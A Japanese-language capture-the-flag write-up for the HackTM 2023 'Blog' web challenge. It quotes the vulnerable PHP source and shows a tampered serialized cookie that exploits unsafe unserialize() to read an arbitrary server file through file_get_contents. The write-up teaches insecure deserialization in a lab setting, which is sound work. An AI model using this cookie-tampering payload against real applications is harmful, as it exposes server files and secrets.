# HackTM CTF Quals 2023 

## [Web] Blog (50 pts, 161 solves)

シンプルなブログの Web サービスが題材の問題。

提供される `Dockerfile` より FLAG は `/02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt` に存在することがわかっているので、この内容を読み出す必要がある。

```dockerfile
FROM php:8.0-apache

COPY ./chal/html /var/www/html
COPY ./chal/db /sqlite3/db
COPY ./chal/flag.txt /02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt
RUN chmod -R 777 /sqlite3/
RUN chmod -R 777 /var/www/html/
```

`index.php` を開くと下記のような PHP のコードが目につく。Cookie `user` がリクエストに設定されていれば、その内容を Base64 デコードした上で `unserialize` している。

```php
<?php
include("util.php");
if (!isset($_COOKIE["user"])) {
    header("Location: /login.php");
    die();
} else {
    $user = unserialize(base64_decode($_COOKIE["user"]));
}
?>
...
```

ここで `login.php` より、Cookie `user` には `util.php` で定義された `User` クラスのインスタンスが `serialize` された上で Base64 形式で格納されていることがわかる。

```php
<?php
...
        $user = new User($username);
        setcookie("user", base64_encode(serialize($user)));
...
?>
```

下記より、`User` は `Profile` クラスを内部に保持するクラスである。ここで、`Profile` クラスの `$picture_path` が `file_get_contents` に渡されている。本来であればこのプロパティの値は変更できないが、Insecure Deserialization を活用すれば変更することができそうである。

```php
class User {
    public $profile;
    public $posts = array();

    public function __construct($username) {
        $this->profile = new Profile($username);
    }

    // get user profile
    public function get_profile() {
        // some dev apparently mixed up user and profile... 
        // so this check prevents any more errors
        if ($this->profile instanceof User) {
            return "@i_use_vscode please fix your code";
        } else {
            // quite unnecessary to assign to a variable imho
            $profile_string = "
            <div>{$this->profile}</div>
            ";
            return $profile_string;
        }
    }

    public function get_posts() {
        // check if we've already fetched posts before to save some overhead
        // (our poor sqlite db is dying)
        if (sizeof($this->posts) !== 0) {
            return "Please reload the page to fetch your posts from the database";
        }

        // get all user posts
        $conn = new Conn;
        $conn->queries = array(new Query(
            "select title, content from posts where user = :user",
            array(":user" => $this->profile->username)
        ));

        // get posts from database
        $result = $conn();
        if ($result[0] !== false) {
            while ($row = $result[0]->fetchArray(1)) {
                $this->posts[] = new Post($row["title"], $row["content"]);
            }
        }

        // build the return string
        $out = "";
        foreach ($this->posts as $post) {
            $out .= $post;
        }
        return $out;
    }

    // who put this?? git blame moment (edit: i checked, it's @i_use_vscode as usual)
    public function __toString() {
        $profile = $this->profile;
        return $profile();
    }
}

class Profile {
    public $username;
    public $picture_path = "images/real_programmers.png";

    public function __construct($username) {
        $this->username = $username;
    }

    // hotfix for @i_use_vscode (see line 97)
    // when removed, please remove this as well
    public function __invoke() {
        if (gettype($this->picture_path) !== "string") {        
            return "<script>window.location = '/login.php'</script>";
        }

        $picture = base64_encode(file_get_contents($this->picture_path));

        // check if user exists
        $conn = new Conn;
        $conn->queries = array(new Query(
            "select id from users where username = :username",
            array(":username" => $this->username)
        ));
        $result = $conn();
        if ($result[0] === false || $result[0]->fetchArray() === false) {
            return "<script>window.location = '/login.php'</script>";
        } else {
            return "
            <div class='card'>
                <img class='card-img-top profile-pic' src='data:image/png;base64,{$picture}'> 
                <div class='card-body'>
                    <h3 class='card-title'>{$this->username}</h3>
                </div>
            </div>
            ";
        }
    }

    // this is the correct implementation :facepalm:
    public function __toString() {
        if (gettype($this->picture_path) !== "string") {        
            return "";
        }

        $picture = base64_encode(file_get_contents($this->picture_path));

        // check if user exists
        $conn = new Conn;
        $conn->queries = array(new Query(
            "select id from users where username = :username",
            array(":username" => $this->username)
        ));
        $result = $conn();
        if ($result[0] === false || $result[0]->fetchArray() === false) {
            return "<script>window.location = '/login.php'</script>";
        } else {
            return "
            <div class='card'>
                <img class='card-img-top profile-pic' src='data:image/png;base64,{$picture}'> 
                <div class='card-body'>
                    <h3 class='card-title'>{$this->username}</h3>
                </div>
            </div>
            ";
        }
    }
}
```

Cookie `user` を Base64 デコードすると下記の内容が得られる。

```text
O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:8:"username";s:7:"tsubasa";s:12:"picture_path";s:27:"images/real_programmers.png";}s:5:"posts";a:0:{}}
```

この `s:27:"images/real_programmers.png"` が前述の `$picture_path` の値に該当する箇所である。これを FLAG のパスに置き換えて Cookie にセットした上でアクセスすると、本来は画像が表示される箇所に Base64 エンコードされた FLAG が格納されていることが確認できる。

なお、シリアライズされたプロパティを編集する際は、文字列長 (`27` の部分) も適宜変更する必要がある。

```text
O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:8:"username";s:7:"tsubasa";s:12:"picture_path";s:46:"/02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt";}s:5:"posts";a:0:{}}
```
